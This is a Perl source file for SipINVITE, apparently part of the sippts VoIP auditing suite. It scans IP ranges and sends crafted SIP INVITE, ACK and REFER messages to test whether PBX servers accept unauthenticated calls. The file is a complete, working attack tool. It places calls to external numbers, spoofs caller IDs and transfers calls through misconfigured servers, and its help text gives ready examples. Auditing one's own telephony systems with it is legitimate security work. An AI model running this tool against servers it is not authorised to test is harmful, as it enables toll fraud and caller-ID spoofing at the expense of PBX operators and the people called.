#!/usr/bin/perl
# -=-=-=-=-
# SipINVITE
# -=-=-=-=-
#
# Sipinvite checks if a PBX server allows us to make calls without
# authentication. If the SIP server has an incorrect configuration, it
# will allow us to make calls to external numbers. It can also allow us
# to transfer the call to a second external number.
# For example, if your Asterisk server has a bad context configuration,
# you can accept INVITE request without authorization. In this case, an
# attacker can make calls without knowing any user/pass.
#
# SipINVITE                     SIP Server                      Phone1              Phone2
#          ---> INVITE       ---> 
#                                         ---> INVITE      --->
#                                         <--- 100 Trying  <---
#          <--- 100 Trying   <---
#                                         <--- 180 Ringing <---
#          <--- 180 Ringing  <---
#                                         <--- 200 Ok      <---
#          <--- 200 Ok       <---
#          ---> ACK          ---> 
#          <--- 200 Ok       <---
#          ---> REFER phone2 ---> 
#                                         --->           INVITE                --->
#          <--- 202 Accept   <---
#                                                             <--->  RTP Session <--->
#                                                               (Phone 1 && phone 2)
#
# Copyright (C) 2015-2019 Jose Luis Verdeguer <pepeluxx@gmail.com>
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
use warnings;
use strict;
use IO::Socket;
use IO::Socket::Timeout;
use NetAddr::IP;
use Getopt::Long;
use Digest::MD5 qw(md5 md5_hex md5_base64);

my $useragent = 'pplsip';

my $ver = 0;
my $host = '';	# host
my $lport = '';	# local port
my $dport = '';	# destination port
my $from = '';	# source number
my $to = '';	# destination number
my $refer = '';	# refer number
my $v = 0;	# verbose mode
my $user = '';	# auth user
my $pass = '';	# auth pass
my $log = 0;

my $realm = '';
my $nonce = '';
my $response = '';
my $digest = '';
my $totag = '';

 
my $to_ip = '';
my $from_ip = '';

my $file = 'sipinvite.log';


sub init() {
	# check params
	my $result = GetOptions ("h=s" => \$host,
				"u=s" => \$user,
				"p=s" => \$pass,
				"d=s" => \$to,
				"s=s" => \$from,
				"ip=s" => \$from_ip,
				"ua=s" => \$useragent,
				"l=s" => \$lport,
				"r=s" => \$dport,
				"t=s" => \$refer,
				"log+" => \$log,
				"v+" => \$v);

	check_version() if ($ver eq 1);
	help() if ($host eq "" || $to eq "");

	$dport = "5060" if ($dport eq "");
	$user = "100" if ($user eq "");
	$from = $user if ($from eq "");

	my @range;
	my @hostlist;

	if ($host =~ /\,/) {
		@hostlist = split(/\,/, $host);

		foreach(@hostlist) {
			my $line = $_;

			if ($line =~ /\-/) {
				my $ip = $line;

				$ip =~ /([0-9|\.]*)-([0-9|\.]*)/;
				my $ipini = $1;
				my $ipfin = $2;

				my $ip2 = $ipini;
				$ip2 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
				my $ip2_1 = int($1);
				my $ip2_2 = int($2);
				my $ip2_3 = int($3);
				my $ip2_4 = int($4);

				my $ip3 = $ipfin;
				$ip3 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
				my $ip3_1 = int($1);
				my $ip3_2 = int($2);
				my $ip3_3 = int($3);
				my $ip3_4 = int($4);

				for (my $i1 = $ip2_1; $i1 <= $ip3_1; $i1++) {
					for (my $i2 = $ip2_2; $i2 <= $ip3_2; $i2++) {
						for (my $i3 = $ip2_3; $i3 <= $ip3_3; $i3++) {
							for (my $i4 = $ip2_4; $i4 <= $ip3_4; $i4++) {
								$ip = "$i1.$i2.$i3.$i4";
								push @range, $ip;
							}
						}
					}
				}
			}
			else {
				my $ip = new NetAddr::IP($line);

				if ($ip < $ip->broadcast) {
					$ip++;

					while ($ip < $ip->broadcast) {
						my $ip2 = $ip;
						$ip2 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
						$ip2 = "$1.$2.$3.$4";
						push @range, $ip2;
						$ip++;
					}
				}
				else {
					push @range, $line;
				}
			}
		}
	}
	else {
		if ($host =~ /\-/) {
			my $ip = $host;

			$ip =~ /([0-9|\.]*)-([0-9|\.]*)/;
			my $ipini = $1;
			my $ipfin = $2;

			my $ip2 = $ipini;
			$ip2 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
			my $ip2_1 = int($1);
			my $ip2_2 = int($2);
			my $ip2_3 = int($3);
			my $ip2_4 = int($4);

			my $ip3 = $ipfin;
			$ip3 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
			my $ip3_1 = int($1);
			my $ip3_2 = int($2);
			my $ip3_3 = int($3);
			my $ip3_4 = int($4);

			for (my $i1 = $ip2_1; $i1 <= $ip3_1; $i1++) {
				for (my $i2 = $ip2_2; $i2 <= $ip3_2; $i2++) {
					for (my $i3 = $ip2_3; $i3 <= $ip3_3; $i3++) {
						for (my $i4 = $ip2_4; $i4 <= $ip3_4; $i4++) {
							$ip = "$i1.$i2.$i3.$i4";
							push @range, $ip;
						}
				
						$ip2_4 = 1;
					}
				
					$ip2_3 = 1;
				}
				
				$ip2_2 = 1;
			}
		}
		else {
			my $ip = new NetAddr::IP($host);

			if ($ip < $ip->broadcast) {
				$ip++;

				while ($ip < $ip->broadcast) {
					my $ip2 = $ip;
					$ip2 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
					$ip2 = "$1.$2.$3.$4";
					push @range, $ip2;
					$ip++;
				}
			}
			else {
				push @range, $host;
			}
		}
	}

	my $nhost = @range;
	my $from_ip2 = $from_ip;

	for (my $i = 0; $i < $nhost; $i++) {
		$to_ip = $range[$i];
		$from_ip = $to_ip if ($from_ip2 eq "");

		my $callid = &generate_random_string(32, 1);
		my $sc = new IO::Socket::INET->new(PeerPort=>$dport, Proto=>'udp', PeerAddr=>$to_ip, Timeout => 10);

		if ($sc) {
			IO::Socket::Timeout->enable_timeouts_on($sc);
			$sc->read_timeout(0.5); # initial short timeout to scan quickly
			$sc->enable_timeout;
			$lport = $sc->sockport() if ($lport eq "");

			# first INVITE
			my $csec = 1;
			my $res = send_invite($sc, $from_ip, $to_ip, $lport, $dport, $from, $to, $digest, $callid, $csec, $user);

			# Authentication
			if (($res =~ /^401/ || $res =~ /^407/) && $user ne '' && $pass ne '') { 
				my $uri = "sip:$to\@$to_ip";
				my $a = md5_hex($user.':'.$realm.':'.$pass);
				my $b = md5_hex('INVITE:'.$uri);
				my $r = md5_hex($a.':'.$nonce.':'.$b);
				$digest = "username=\"$user\", realm=\"$realm\", nonce=\"$nonce\", uri=\"$uri\", response=\"$r\", algorithm=MD5";

				$res = send_ack($sc, $from_ip, $to_ip, $lport, $dport, $from, $to, "", $callid, $csec);
				$csec++;
				$res = send_invite($sc, $from_ip, $to_ip, $lport, $dport, $from, $to, $digest, $callid, $csec, $user);
			}

			# Transfer call
			if ($res =~ /^200/ && $refer ne "") {
				$csec++;
				$res = send_ack($sc, $from_ip, $to_ip, $lport, $dport, $from, $to, $digest, $callid, $csec);
				$csec++;
				$res = send_refer($sc, $from_ip, $to_ip, $lport, $dport, $from, $to, $digest, $callid, $csec, $user, $refer);
			}
		}
	}

	exit;
}


# Send INVITE message
sub send_invite {
	my $sc = shift;
	my $from_ip = shift;
	my $to_ip = shift;
	my $lport = shift;
	my $dport = shift;
	my $from = shift;
	my $to = shift;
	my $digest = shift;
	my $callid = shift;
	my $cseq = shift;
	my $user = shift;

	my $branch = &generate_random_string(71, 0);
	
	my $msg = "INVITE sip:".$to."@".$to_ip." SIP/2.0\r\n";
	$msg .= "Via: SIP/2.0/UDP $from_ip:$lport;branch=$branch\r\n";
	$msg .= "From: \"$from\" <sip:".$user."@".$from_ip.">;tag=0c26cd11\r\n";
	$msg .= "To: <sip:".$to."@".$to_ip.">\r\n";
	$msg .= "Contact: <sip:".$from."@".$from_ip.":$lport;transport=udp>\r\n";
	$msg .= "Authorization: Digest $digest\r\n" if ($digest ne "");
	$msg .= "Call-ID: ".$callid."\r\n";
	$msg .= "CSeq: $cseq INVITE\r\n";
	$msg .= "User-Agent: $useragent\r\n";
	$msg .= "Max-Forwards: 70\r\n";
	$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
	$msg .= "Content-Type: application/sdp\r\n";

	my $sdp .= "v=0\r\n";
	$sdp .= "o=anonymous 1312841870 1312841870 IN IP4 $from_ip\r\n";
	$sdp .= "s=session\r\n";
	$sdp .= "c=IN IP4 $from_ip\r\n";
	$sdp .= "t=0 0\r\n";
	$sdp .= "m=audio 2362 RTP/AVP 0\r\n";
	$sdp .= "a=rtpmap:18 G729/8000\r\n";
	$sdp .= "a=rtpmap:0 PCMU/8000\r\n";
	$sdp .= "a=rtpmap:8 PCMA/8000\r\n\r\n";

	$msg .= "Content-Length: ".length($sdp)."\r\n\r\n";
	$msg .= $sdp;

	print $sc $msg;

	if ($v eq 0) { print "[+] $from_ip\tSending INVITE $from => $to\n"; }
	else { print "Sending:\n=======\n$msg"; }

	my $data = "";
	my $response = "";
	my $line = "";
	my $ua = "";
	my $cont = 0;

	LOOP: {
		while (<$sc>) {
			$sc->read_timeout(15); # if we have a response, increase timeout
			$line = $_;
			
			if ($line =~ /^SIP\/2.0/ && ($response eq "" || $response =~ /^1/)) {
				$line =~ /^SIP\/2.0\s(.+)\r\n/;
				
				if ($1) { $response = $1; }
			}
				
			if ($line =~ /[Uu]ser\-[Aa]gent/ && $ua eq "") {
				$line =~ /[Uu]ser\-[Aa]gent\:\s(.+)\r\n/;

				$ua = $1 if ($1);
			}

			if ($line =~ /^To/i && $line =~ /;tag/i) {
				$line =~ /;tag=(.+)\r\n/;
				$totag = $1 if ($1);
			}

			if ($line =~ /^WWW-Authenticate:/ || $line =~ /^Proxy-Authenticate:/) {
				$line =~ /.*realm=\"([a-zA-Z0-9\.\_\-]*)\".*/;
				$realm = $1 if ($1);
				$line =~ /.*nonce=\"([a-zA-Z0-9\/\=\.\_\-\,]*)\".*/;
				$nonce = $1 if ($1);
			}
 
			$data .= $line;
 
			if ($line =~ /^\r\n/) {
				if ($log eq 1) {
					open(my $fh, '>>', $file) or die "Could not open file '$file' $!";
					if ($cont eq 0) {
						print $fh "[+] $from_ip\tSending INVITE $from => $to\n";
						print $fh "[-] UserAgent: $ua\n";
					}
					print $fh "[-] $response\n";
					close $fh;
				}
				
				$cont++;
				
				if ($v eq 0) { print "[-] $response\n"; }
				else { print "Receiving:\n=========\n$data"; }

				last LOOP if ($response !~ /^1/);

				$data = "";
				$response = "";
			}
		}
	}

	if ($v eq 0 && $ua ne "") { print "[-] UserAgent: $ua\n"; }

	return $response;
}

# Send ACK message
sub send_ack {
	my $sc = shift;
	my $from_ip = shift;
	my $to_ip = shift;
	my $lport = shift;
	my $dport = shift;
	my $from = shift;
	my $to = shift;
	my $digest = shift;
	my $callid = shift;
	my $cseq = shift;
	
	my $branch = &generate_random_string(71, 0);
	
	my $msg = "ACK sip:".$to."@".$to_ip." SIP/2.0\r\n";
	$msg .= "From: $from <sip:".$from."@".$from_ip.">;tag=0c26cd11\r\n";
	$msg .= "To: $to <sip:".$to."@".$to_ip.">;tag=$totag\r\n";
	$msg .= "Via: SIP/2.0/UDP $to_ip:$lport;branch=$branch;rport\r\n";
	$msg .= "Call-ID: ".$callid."\r\n";
	$msg .= "CSeq: $cseq ACK\r\n";
	$msg .= "Contact: <sip:".$to."@".$to_ip.":$lport>\r\n";
	$msg .= "Authorization: Digest $digest\r\n" if ($digest ne "");
	$msg .= "User-Agent: $useragent\r\n";
	$msg .= "Max-Forwards: 70\r\n";
	$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
	$msg .= "Content-Length: 0\r\n\r\n";

	print $sc $msg;

	if ($v eq 0) { print "[+] Sending ACK\n"; }
	else { print "Sending:\n=======\n$msg"; }

	my $data = "";
	my $response = "";
	my $line = "";

	if ($digest ne "") {
		LOOP: {
			while (<$sc>) {
				$line = $_;
			
				if ($line =~ /^SIP\/2.0/ && ($response eq "" || $response =~ /^1/)) {
					$line =~ /^SIP\/2.0\s(.+)\r\n/;
				
					if ($1) { $response = $1; }
				}
				
				$data .= $line;
 
				if ($line =~ /^\r\n/) {
					if ($log eq 1) {
						open(my $fh, '>>', $file) or die "Could not open file '$file' $!";
						print $fh "[+] Sending ACK\n";
						print $fh "[-] $response\n";
						close $fh;
					}
				
					if ($v eq 0) { print "[-] $response\n"; }
					else { print "Receiving:\n=========\n$data"; }

					last LOOP if ($response !~ /^1/);

					$data = "";
					$response = "";
				}
			}
		}
	}
	
	return $response;
}

# Send REFER message
sub send_refer {
	my $sc = shift;
	my $from_ip = shift;
	my $to_ip = shift;
	my $lport = shift;
	my $dport = shift;
	my $from = shift;
	my $to = shift;
	my $digest = shift;
	my $callid = shift;
	my $cseq = shift;
	my $user = shift;
	my $referto = shift;
	
	my $branch = &generate_random_string(71, 0);

	my $msg = "REFER sip:".$to."@".$to_ip." SIP/2.0\r\n";
	$msg .= "From: $user <sip:".$user."@".$to_ip.">;tag=0c26cd11\r\n";
	$msg .= "To: $to <sip:".$to."@".$to_ip.">;tag=$totag\r\n";
	$msg .= "Via: SIP/2.0/UDP $to_ip:$lport;branch=$branch;rport\r\n";
	$msg .= "Call-ID: ".$callid."\r\n";
	$msg .= "CSeq: $cseq REFER\r\n";
	$msg .= "Contact: <sip:".$user."@".$from_ip.":$lport>\r\n";
	$msg .= "Authorization: Digest $digest\r\n" if ($digest ne "");
	$msg .= "User-Agent: $useragent\r\n";
	$msg .= "Max-Forwards: 70\r\n";
	$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
	$msg .= "Refer-To: <sip:".$referto."@".$to_ip.">\r\n";
	$msg .= "Referred-By: <sip:".$user."@".$from_ip.":$lport>\r\n";
	$msg .= "Content-Length: 0\r\n\r\n";

	print $sc $msg;

	if ($v eq 0) { print "[+] Sending REFER $from => $referto\n"; }
	else { print "Sending:\n=======\n$msg"; }

	my $data = "";
	my $response = "";
	my $line = "";

	LOOP: {
		while (<$sc>) {
			$line = $_;
			
			if ($line =~ /^SIP\/2.0/ && ($response eq "" || $response =~ /^1/)) {
				$line =~ /^SIP\/2.0\s(.+)\r\n/;
				
				if ($1) { $response = $1; }
			}
				
			$data .= $line;
 
			if ($line =~ /^\r\n/) {
				if ($log eq 1) {
					open(my $fh, '>>', $file) or die "Could not open file '$file' $!";
					print $fh "[+] Sending REFER $from => $referto\n";
					print $fh "[-] $response\n";
					close $fh;
				}
				
				if ($v eq 0) { print "[-] $response\n"; }
				else { print "Receiving:\n=========\n$data"; }

				last LOOP if ($response !~ /^1/);

				$data = "";
				$response = "";
			}
		}
	}
	
	return $response;
}

# Generate a random string
sub generate_random_string {
	my $length_of_randomstring = shift;
	my $only_hex = shift;
	my @chars;

	if ($only_hex == 0) {
		@chars = ('a'..'z','0'..'9');
	}
	else {
		@chars = ('a'..'f','0'..'9');
	}

	my $random_string;

	foreach (1..$length_of_randomstring) {
		$random_string.=$chars[rand @chars];
	}

	return $random_string;
}
 
sub check_version {
	my $version = '';
	my $versionfile = 'version';
	open(my $fh, '<:encoding(UTF-8)', $versionfile)
	or die "Could not open file '$versionfile' $!";
	
	while (my $row = <$fh>) {
		chomp $row;
		$version = $row;
	}

	my $v = `curl -s https://raw.githubusercontent.com/Pepelux/sippts/master/version`;
	$v =~ s/\n//g;

	if ($v ne $version) {	
		print "The current version ($version) is outdated. There is a new version ($v). Please update:\n";
		print "https://github.com/Pepelux/sippts\n";
	}
	else {
		print "The current version ($version) is latest.\n";
	}

	exit;
}

sub help {
    print qq{
SipINVITE - by Pepelux <pepeluxx\@gmail.com>
---------
Wiki: https://github.com/Pepelux/sippts/wiki/SIPinvite

Usage: perl $0 -h <host> -d <dst_number> [options]
 
== Options ==
-d  <integer>    = Destination number
-u  <string>     = Username to authenticate
-p  <string>     = Password to authenticate
-s  <integer>    = Source number (CallerID) (default: 100)
-l  <integer>    = Local port (default: 5070)
-r  <integer>    = Remote port (default: 5060)
-t  <integer>    = Transfer call to another number
-ip <string>     = Source IP (by default it is the same as host)
-ua <string>     = Customize the UserAgent
-v               = Verbose (trace information)
-log             = Save results into sipinvite.log file
-version         = Show version and search for updates
 
== Examples ==
\$perl $0 -h 192.168.0.1 -d 100
\tTrying to make a call to exten 100 (without auth)
\$perl $0 -h 192.168.0.1 -u sipuser -p supersecret -d 100 -r 5080
\tTrying to make a call to exten 100 (with auth)
\$perl $0 -h 192.168.0.1 -s 200 -d 555555555 -v
\tTrying to make a call to number 555555555 (without auth) with source number 200
\$perl $0 -h 192.168.0.1 -d 555555555 -t 666666666
\tTrying to make a call to number 555555555 (without auth) and transfer it to number 666666666
\$perl $0 -h 192.168.0.1 -d 555555555 -t 666666666 -s 123456789
\tTrying to make a call to number 555555555 (without auth) using callerid 123456789 and transfer it to number 666666666
 
};
 
    exit 1;
}
 
init();
